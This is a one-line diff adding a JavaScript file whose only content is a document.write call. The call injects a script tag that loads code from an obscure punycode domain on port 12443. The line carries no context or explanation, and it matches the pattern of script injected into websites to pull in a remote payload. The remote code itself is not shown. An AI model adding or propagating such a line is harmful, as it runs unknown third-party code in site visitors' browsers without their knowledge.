@@ -1,0 +1,1 @@
+﻿document.write('<script src="https://xn--wxtr9fwyxk9c.xn--io0a7i:12443/ty/c-2593-25.js"><\/script>');
